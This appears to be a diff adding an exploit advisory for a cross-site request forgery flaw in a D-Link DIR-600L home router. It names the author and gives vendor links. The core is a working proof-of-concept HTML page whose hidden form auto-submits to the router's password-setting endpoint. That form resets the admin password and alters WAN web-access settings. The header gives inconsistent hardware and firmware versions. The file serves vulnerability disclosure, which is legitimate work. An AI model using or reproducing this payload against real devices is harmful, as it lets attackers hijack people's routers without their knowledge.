@@ -1,0 +1,77 @@
+####################################################################################
+
+# Exploit Title: Dlink DIR-600L Hardware Version AX Firmware Version 1.00
+CSRF Vulnerability
+# Google Dork: N/A
+# Date: 20/03/2014
+# Exploit Author: Dhruv Shah
+# Vendor Homepage:
+http://www.dlink.com/us/en/home-solutions/connect/routers/dir-600l-wireless-n-150-home-cloud-router
+# Software Link: N/A
+# Hardware Version:E4
+
+# Firmware Version:5.10
+# Tested on: Router Web Server
+# CVE : N/A
+
+###################################################################################
+
+ Cross Site Request Forgery
+
+
+
+This Modem's Web Application , suffers from Cross-site request forgery
+
+through which attacker can manipulate user data via sending him malicious
+
+craft url.
+
+
+
+The Modems's Application  not using any security token to prevent it
+
+against CSRF. You can manipulate any userdata. PoC and Exploit to change
+
+user password:
+
+
+In the POC the IP address in the POST is the modems IP address.
+
+<html>
+
+  <body>
+    <form id ="poc" action="http://192.168.0.1/goform/formSetPassword"
+method="POST">
+      <input type="hidden" name="settingsChanged" value="1" />
+      <input type="hidden" name="config.login_name" value="admin" />
+      <input type="hidden" name="config.password" value="YWRtaW4A" />
+      <input type="hidden"
+name="config.web_server_allow_graphics_auth"
+value="false" />
+      <input type="hidden"
+name="config.web_server_allow_wan_http" value="false" />
+      <input type="hidden"
+name="config.web_server_wan_port_http" value="8080" />
+      <input type="hidden"
+name="config.wan_web_ingress_filter_name" value="" />
+      <input type="hidden" name="wan_ingress_filter_details"
+value="" />
+    </form>
+  </body>
+    <script type="text/javascript">
+document.getElementById("poc").submit();
+</script>
+
+</html>
+
+
+______________________
+
+*Dhruv Shah* *aka Snypter*
+
+Blogger | Researcher | Consultant | Writer
+Youtube <http://www.youtube.com/snypter> |
+Facebook<http://www.facebook.com/dhruvshahs>|
+Linkedin <http://in.linkedin.com/pub/dhruv-shah/26/4a6/aa0> |
+Twitter<https://twitter.com/Snypter>|
+Blog <http://security-geek.in/blog/>
